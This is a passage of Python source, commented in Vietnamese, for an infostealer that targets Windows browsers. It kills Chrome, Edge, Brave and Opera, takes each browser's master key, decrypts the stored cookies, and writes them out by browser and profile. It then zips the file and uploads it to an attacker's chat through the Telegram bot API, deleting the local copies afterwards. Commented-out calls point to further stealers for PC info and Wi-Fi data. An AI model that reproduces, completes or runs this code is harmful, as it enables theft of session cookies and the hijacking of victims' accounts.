        # Đóng các browser để tránh lock
        print("\n🔄 Đang đóng các browser...")
        os.system('taskkill /f /im chrome.exe 2>nul')
        os.system('taskkill /f /im msedge.exe 2>nul')
        os.system('taskkill /f /im brave.exe 2>nul')
        os.system('taskkill /f /im opera.exe 2>nul')
        time.sleep(2)
        
        print("\n🔓 Đang giải mã cookies...")
        
        for browser_name, browser_path in self.browsers.items():
            if not os.path.exists(browser_path):
                continue
            
            # Lấy master key
            if browser_name not in self.master_keys:
                print(f"\n📁 Đang xử lý: {browser_name}")
                self.master_keys[browser_name] = self.get_master_key(browser_path)
            
            master_key = self.master_keys[browser_name]
            if not master_key:
                print(f"  ❌ Không thể lấy master key cho {browser_name}")
                continue
            
            self.extract_cookies_from_browser(browser_name, browser_path, master_key)
    
    def create_zip_and_send(self):
        """Tạo zip và gửi qua Telegram"""
        if not self.all_cookies:
            print("\n❌ Không tìm thấy cookies nào!")
            return
        
        print(f"\n✅ Tổng cộng: {len(self.all_cookies)} cookies đã giải mã!")
        
        # Thống kê theo browser
        browser_stats = {}
        for cookie in self.all_cookies:
            browser = cookie['browser']
            browser_stats[browser] = browser_stats.get(browser, 0) + 1
        
        print("\n📊 Thống kê theo browser:")
        for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True):
            print(f"  📁 {browser}: {count} cookies")
        
        # Lưu cookies vào file
        cookie_file = os.path.join(self.temp_path, "Cookies", "all_cookies.txt")
        with open(cookie_file, "w", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("BROWSER COOKIES\n")
            f.write(f"Tổng số: {len(self.all_cookies)} cookies\n")
            f.write("="*80 + "\n\n")
            
            # Nhóm theo browser
            browser_groups = {}
            for cookie in self.all_cookies:
                browser = cookie['browser']
                if browser not in browser_groups:
                    browser_groups[browser] = []
                browser_groups[browser].append(cookie)
            
            for browser_name, cookies in browser_groups.items():
                f.write(f"\n{'='*80}\n")
                f.write(f"BROWSER: {browser_name} ({len(cookies)} cookies)\n")
                f.write(f"{'='*80}\n\n")
                
                # Nhóm theo profile
                profile_groups = {}
                for cookie in cookies:
                    profile = cookie['profile']
                    if profile not in profile_groups:
                        profile_groups[profile] = []
                    profile_groups[profile].append(cookie)
                
                for profile_name, profile_cookies in profile_groups.items():
                    f.write(f"\n--- Profile: {profile_name} ---\n\n")
                    for cookie in profile_cookies:
                        f.write(f"Host: {cookie['host']}\n")
                        f.write(f"Name: {cookie['name']}\n")
                        f.write(f"Path: {cookie['path']}\n")
                        f.write(f"Value: {cookie['value']}\n")
                        f.write(f"Expires: {cookie['expires']}\n")
                        f.write("-"*80 + "\n")
        
        # Tạo zip
        zip_path = os.path.join(self.temp_path, "Cookies", "cookies_data.zip")
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(cookie_file, os.path.basename(cookie_file))
        
        # Gửi qua Telegram
        print("\n📤 Đang gửi qua Telegram...")
        self.send_file_to_telegram(zip_path)
        self.send_message_to_telegram(f"✅ Trích xuất {len(self.all_cookies)} cookies từ tất cả browser!")
        
        # Xóa file tạm
        if os.path.exists(cookie_file):
            os.remove(cookie_file)
        if os.path.exists(zip_path):
            os.remove(zip_path)
    
    def send_file_to_telegram(self, file_path: str):
        """Gửi file qua Telegram"""
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        retries = 3
        for attempt in range(retries):
            try:
                with open(file_path, 'rb') as file:
                    response = requests.post(
                        url,
                        files={'document': file},
                        data={'chat_id': chat_id}
                    )
                if response.status_code == 200:
                    print("✅ Gửi file thành công!")
                    return response
                else:
                    print(f"❌ Không thể gửi tệp. Mã trạng thái: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"❌ Lần thử {attempt + 1} thất bại: {e}")
                if attempt < retries - 1:
                    time.sleep(5)
                else:
                    print("Đã thử tối đa. Không thể gửi tệp.")
        return None
    
    def send_message_to_telegram(self, message: str):
        """Gửi tin nhắn qua Telegram"""
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        try:
            response = requests.post(
                url,
                data={'chat_id': chat_id, 'text': message}
            )
            return response.status_code == 200
        except:
            return False       
def main():
    #PcInfo()
    Browser()
    #Cookie()
    #Wifi()  
    

if __name__ == "__main__":
    main()